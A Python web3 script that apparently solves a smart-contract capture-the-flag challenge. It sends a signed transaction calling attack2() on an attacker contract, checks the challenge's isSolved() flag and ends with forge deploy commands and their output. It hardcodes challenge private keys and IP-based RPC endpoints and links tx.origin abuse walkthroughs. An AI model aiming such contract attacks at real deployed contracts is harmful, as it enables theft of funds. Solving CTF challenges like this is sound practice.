from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy


x = {
    "PrivateKey": "0xfa3daf3872c4f80dcba08d7528a24f6eb6a00d780fc7f1ebc3cbe0c4e8314ced",
    "Address": "0xd44C694e6280032dA55cEF6715aA3d89c1AD4836",
    "TargetAddress": "0xc8d36A3b105fB53aBdaa26Df1661264fbAe2B42E",
    "setupAddress": "0x439c8a7099bdc7Fd924C9F3eB1915223B4f1A57A"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

Target2Address = "0xd44C694e6280032dA55cEF6715aA3d89c1AD4836"
Target2Contract = "0x28aD9639a0a1C0092746232a99bD23421ef3DBE1"

url = 'http://46.101.78.65:31716/rpc'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
print(block_number)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)

#solcjs --abi --bin Setup.sol #generate .abi .bin
#with open('Setup_sol_Setup.abi','r') as f:
#       abi = json.load(f)

#contract_instance = w3.eth.contract(address=SetupContract, abi=abi)

account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

#construct_txn = contract_instance.constructor().buildTransaction(
#       {
#               'from': account_from['address'],
#               'nonce': w3.eth.get_transaction_count(account_from['address']),
#	       'value': 1
#       }
#)

#tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
#tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
#tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

with open('Contract_sol_Contract.abi','r') as f:
        abi = json.load(f)
contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
construct_txn = contract_instance2.functions.attack2().build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                #'from': Target2Address,
                #'nonce': w3.eth.get_transaction_count(Target2Address),
                'chainId': w3.eth.chain_id,
		#'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

with open('Setup_sol_Setup.abi','r') as f:
        abi = json.load(f)

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved().call()

print(f'The current number stored is: { number } ')


'''
https://ctftime.org/writeup/31583
https://0xsage.medium.com/ethernaut-lvl-4-walkthrough-how-to-abuse-tx-origin-msg-sender-ef37d6751c8

forge init . --no-git

forge create src/Contract.sol:Contract --rpc-url http://209.97.176.174:31323/rpc --private-key 0x643f9dae7f3636d00fddb4236351c6136001b2cb5641b49ea1f72c327e5f1981
[⠰] Compiling...
[⠔] Compiling 1 files with 0.8.20
[⠒] Solc 0.8.20 finished in 40.18ms
Compiler run successful!
Deployer: 0xd44C694e6280032dA55cEF6715aA3d89c1AD4836
Deployed to: 0x28aD9639a0a1C0092746232a99bD23421ef3DBE1
Transaction hash: 0xfcbc1aca59dc9b42ce5c917c38d28b7ba60488ab115b25aa9c425ac6513709e0


Change the address in Contract.sol, align with TargetAddress in rpc url
Change the address in dec.py, align with the new deplyed address by forge

'''
